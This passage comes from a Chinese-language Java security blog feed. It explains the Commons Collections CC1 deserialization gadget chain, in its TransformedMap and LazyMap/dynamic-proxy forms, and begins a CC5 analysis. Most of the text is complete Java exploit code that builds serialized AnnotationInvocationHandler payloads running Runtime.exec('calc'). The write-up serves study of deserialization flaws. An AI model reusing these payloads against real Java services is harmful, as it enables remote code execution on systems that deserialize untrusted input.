class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>

<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这样是能成功运行了，但是发现这样嵌套是有点麻烦的</p>
<p>然后注意到有个<strong>ChainedTransformer</strong>类，这个类也是实现了<strong>Transformer</strong>接⼝的⼀个类，它的作⽤是将内部的多个<strong>Transformer</strong>串在⼀起。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通俗来讲就是前⼀个回调返回的结果，作为后⼀个回调的参数传⼊</p>
<p>所以重写个**Transformer[]**数组用来存放</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMp);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>执行后会发现，在没有序列化前就已经可以弹出计算器了，而且在反序列化后是没有执行成功的，还报出了这个错误</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationTypeMismatchExceptionProxy<span class="string">&#x27; does not exist</span></span><br></pre></td></tr></table></figure></div>

<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><strong>debug</strong>发现，在<strong>setValue</strong>时，其中的<strong>value</strong>的值不是我们传的<strong>RunTime.class</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">    <span class="comment">/** The parent map */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(entry);</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里就需要<strong>ConstantTransformer</strong>类，我们看到这个类里面也有<strong>transform</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据代码我们可以看出，<strong>transform</strong>可以返回构造器中的<strong>iConstant</strong></p>
<p>而且可以实现传入什么值，就会返回某个值</p>
<p>这样就能将value的值转为<strong>Runtime.class</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMp);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这是P牛在Java漫谈中讲解的一条利用<strong>TransformedMap</strong>构造的一条<strong>CC1</strong>链</p>
<h1 id="0x03-ysoserial的CC1"><a href="#0x03-ysoserial的CC1" class="headerlink" title="0x03 ysoserial的CC1"></a>0x03 ysoserial的CC1</h1><p>上面的代码是可以正常利用了，但是不算是真正的<strong>CC1</strong>链</p>
<p>因为<strong>ysoserial</strong>中使用的是<strong>LazyMap</strong>，代替了<strong>TransformedMap</strong></p>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure></div>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>知道利用链了，直接看对应类和方法了</p>
<p><strong>LazyMap</strong>和<strong>TransformedMap</strong>类似，都来自于<strong>Common-Collections</strong>库，并继承 <strong>AbstractMapDecorator</strong></p>
<p>可以看到从<strong>ChainedTransformer</strong>的命令是一样的</p>
<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>所以从<strong>LazyMap</strong>的**get()**方法看起</p>
<p><strong>TransformedMap</strong>是在写入元素的时候执行命令</p>
<p>而<strong>LazyMap</strong>是在<strong>get()<strong>方法找不到</strong>key</strong>值的时候，去调用**factory.transform()**方法去获取一个值</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br></pre></td></tr></table></figure></div>

<p>而<strong>factory</strong>是一个可控的<strong>Transformer</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure></div>

<p>但调用**get()**方法的太多了，直接就看它的了</p>
<p>由于在<strong>AnnotationInvocationHandler</strong>的<strong>readObject</strong>中没有直接调用**get()**的方法</p>
<p>所以走了<strong>AnnotationInvocationHandler</strong>的**invoke()<strong>方法，里面有调用到</strong>get()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    </span><br><span class="line">       <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">   <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">   <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line">   <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">       <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line">   <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">       result = cloneArray(result);</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>怎么才能调用这个**invoke()**方法呢？</p>
<p>那就该利用动态代理了</p>
<p>当动态代理类的代理对象调用任意方法的时候，就会进入到这个实现了<strong>InvocationHandler</strong>接口的类中的**invoke()**方法中</p>
<p>而且可以发现这个类实现了<strong>InvocationHandler</strong>接口，因此能够用作动态代理</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable&#123;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是我们会发现<strong>AnnotationInvocationHandler</strong>的**invoke()<strong>方法中，如果想要调用</strong>get()**方法，还需要绕过两个if判断</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当你调用<strong>equals</strong>方法，就会直接<strong>return</strong>这个<strong>equalsImpl</strong>方法</p>
<p>而且当你<strong>paramTypes.length !&#x3D; 0</strong>，就是说调用有参方法的话，就会抛出异常</p>
<p>所以我们要在<strong>AnnotationInvocationHandler</strong>的<strong>readObject</strong>的一个无参方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>挺凑巧，刚好有个<strong>memberValues.entrySet()</strong></p>
<p>而且<strong>AnnotationInvocationHandler</strong>接收<strong>Map</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues</span><br></pre></td></tr></table></figure></div>

<p>并且入口类是<strong>AnnotationInvocationHandler</strong>，所以还需要重新实例化下<strong>mapProxy</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/09/Java%E5%AE%89%E5%85%A8/CommonsCollection1%E5%88%A9%E7%94%A8%E9%93%BE/image-20231019193922523.png"
                      class="" title="image-20231019193922523"
                >

<ul>
<li><code>TransformedMap</code>链</li>
</ul>
<p>从<code>AnnotationInvocationHandler.readObject()</code>开始，调用<code>TransformedMap</code>类从其父类<code>AbstractInputCheckedMapDecorator</code>中继承<code>setValue()</code>方法</p>
<p>然后调用<code>TransformedMap.checkSetvalue()</code>，该方法将调用传入<code>ChainedTransformer</code>里的<code>Transformer</code>接口的<code>transform()</code>方法</p>
<p>而<code>ConstantTransform</code>类和<code>InvokerTransformer</code>类以及反射的配合，实现了任意代码执行</p>
<ul>
<li><code>LazyMap</code>链</li>
</ul>
<p>同样从<code>AnnotationInvocationHandler.readObject()</code>开始，利用动态代理调用被代理类的任意方法能够调用invoke()方法的特性</p>
<p>从<code>AnnotationInvocationHandler</code>的<code>entrySet()</code>方法触发<code>AnnotationInvocationHandler.invoke()</code>方法</p>
<p>从而实现调用<code>LazyMap.get()</code>，在从<code>get()</code>方法走到<code>transform()</code>方法，后面的内容相同</p>
<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSechttps://space.bilibili.com/2142877265f" >https://github.com/Y4tacker/JavaSechttps://space.bilibili.com/2142877265f <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections1</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections5</title>
    <url>/2023/09/24/Java%E5%AE%89%E5%85%A8/CommonsCollection5%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h1 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h1><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><p><strong>CC5</strong>没有使用<strong>HashMap.readObject</strong>作为入口类，而是使用了**BadAttributeValueExpException.readObject()<strong>作为入口类，不过最后都是走到</strong>LazyMap.get()**方法</p>
<p>先来看看<strong>CC5</strong>链的入口类<strong>BadAttributeValueExpException</strong>的**readObject()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

